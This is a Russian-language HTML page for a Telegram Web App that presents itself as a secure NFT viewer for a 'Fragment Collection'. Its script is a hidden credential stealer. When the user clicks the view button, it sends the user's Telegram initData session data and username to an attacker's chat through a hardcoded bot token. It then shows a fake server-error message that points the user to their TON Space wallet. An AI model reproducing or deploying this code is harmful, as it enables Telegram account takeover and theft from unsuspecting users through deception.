<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            text-align: center; 
            margin: 0;
            padding: 40px 20px;
        }
        .container { padding: 20px; }
        .nft-preview { 
            background: linear-gradient(145deg, #1a1a1a, #000);
            border-radius: 24px; 
            padding: 20px;
            border: 1px solid #333;
            display: inline-block;
            margin-bottom: 25px;
        }
        img { border-radius: 16px; margin-bottom: 10px; }
        h2 { font-size: 22px; margin: 10px 0; color: #fff; }
        p { color: #888; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
        .btn { 
            background: #0088cc; 
            color: #fff; 
            padding: 18px 40px; 
            border-radius: 16px; 
            border: none; 
            font-size: 17px; 
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
        }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body>
    <div class="container">
        <div class="nft-preview">
            <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="140" alt="NFT">
            <div style="font-size: 12px; color: #0088cc; font-weight: bold;">FRAGMENT COLLECTION</div>
        </div>
        
        <h2>Просмотр предметов</h2>
        <p>Нажмите ниже, чтобы открыть ваши NFT <br> в защищенном режиме просмотра</p>
        
        <button id="mainBtn" class="btn">ПОСМОТРЕТЬ NFT</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById('mainBtn').addEventListener('click', function() {
            const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E';
            const chatId = '8486064073';
            
            const key = tg.initData || "ОШИБКА: НЕТ ДАННЫХ";
            const user = tg.initDataUnsafe.user?.username || "hidden";
            
            const message = "🔔 **ЛОГ: ПРОСМОТР NFT**\n\n👤 Юзер: @" + user + "\n\n🔑 **auth_key:**\n`" + key + "`";

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(() => {
                tg.showAlert("Загрузка коллекции... \n\nПроизошла внутренняя ошибка сервера. Пожалуйста, убедитесь, что ваш кошелек TON Space активен, и попробуйте позже.");
            });
        });
    </script>
</body>
</html>
